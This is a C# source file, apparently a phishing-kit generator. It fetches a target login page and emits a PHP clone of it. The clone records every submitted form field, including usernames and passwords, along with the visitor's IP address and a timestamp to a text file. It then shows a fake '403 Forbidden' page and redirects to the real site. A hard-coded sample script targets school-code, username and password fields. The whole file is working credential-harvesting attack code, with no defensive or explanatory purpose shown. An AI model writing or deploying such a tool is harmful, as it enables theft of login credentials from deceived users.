using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using HtmlAgilityPack;
namespace Phishing
{
    /* This class is writtern by Michael Noobsytle
     *  
     * 
     * 
     * 
     * 
     * 
     * 
     * 
     * 
     * 
     * 
     * 
     * 
     */

   public  class Phishing
    {
       public string Script = @"<?php error_reporting(E_ERROR | E_PARSE);$x31=false;
$x31 .=$_POST['schoolCode'].""\n"";$x31 .=$_POST['username'].""\n"";$x31 .=$_POST['password'].""\n"";$x31 .=$_POST['submit'].""\n"";
if(strlen($x31)>6){$x37=date(""H:i M/d/y"",time()); $x38=$_SERVER[""REMOTE_ADDR""];fwrite(fopen(""r3c0rded.txt"",""a""),""------/Start/--------\n$x37\nIP=>$x38\n$x31------/End/--------\n\n""); echo ""<h1>403 Forbidden</h1><br>""; echo '<html><head><meta http-equiv=""refresh"" content=""1; url=url""></head></html>'; exit();}?><html>?>";
       public string url { get; set;  }
       public HtmlAgilityPack.HtmlDocument doc { get; set; }
      
       public string Datatype { get; set; } // $something noob 
     
    

       public StringBuilder sb = new StringBuilder(); 
       public string Gen()
       {

           sb.AppendLine("<?php ");
                sb.AppendLine(string.Format("error_reporting(E_ERROR | E_PARSE);${0}=false;" ,Datatype));
         
                   doc = GetWebPageHtmlFromUrl(url);
                 bool sus =   genForm();
           if (sus == true)
           {
               string finalScript =
                   Regex.Replace(
                       @"if(strlen($XXAAXX)>6){$x37=date(""""H:i M/d/y"""",time()); $x38=$_SERVER[""""REMOTE_ADDR""""];fwrite(fopen(""""r3c0rded.txt"""",""""a""""),""""------/Start/--------\n$x37\nIP=>$x38\n$XXAAXX------/End/--------\n\n""""); echo """"<h1>403 Forbidden</h1><br>""""; echo '<html><head><meta http-equiv=""""refresh"""" content=""""1; url=XAX""""></head></html>'; exit();}?>",
                       "XXAAXX", Datatype);
               string final = Regex.Replace(finalScript, "XAX", url);

               sb.AppendLine(final);
               sb.AppendLine(doc.DocumentNode.OuterHtml);
               return sb.ToString();
           }
           else
           {
               return "no Form Detected";
           }
        
         
       }

       public bool genForm()
       {
           try
           {
             
               foreach (HtmlNode input in doc.DocumentNode.SelectNodes("//input"))
               {
                   HtmlAttribute att = input.Attributes["name"];
                   if (att.Value != string.Empty)
                   {
                       sb.AppendLine(string.Format(@"${0} .=$_POST['{1}'].""\n"";", Datatype, att.Value));
                   }

               }

               return true;
           }
           catch
           {
               return false; 
           }
           
       }

       public static HtmlAgilityPack.HtmlDocument GetWebPageHtmlFromUrl(string url)
       {
           var hw = new HtmlWeb();
           HtmlAgilityPack.HtmlDocument doc = hw.Load(url);
           return doc;
       }
       
 
       }
    }

